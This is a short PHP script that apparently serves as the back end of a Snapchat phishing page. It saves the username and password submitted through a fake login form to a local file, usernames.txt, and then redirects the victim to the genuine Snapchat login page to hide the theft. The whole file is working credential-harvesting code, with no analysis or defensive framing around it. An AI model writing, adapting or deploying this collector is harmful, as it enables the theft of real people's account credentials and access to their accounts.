<?php

file_put_contents("usernames.txt","\n" . "Snapchat" . "\n" . "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/login');
exit();
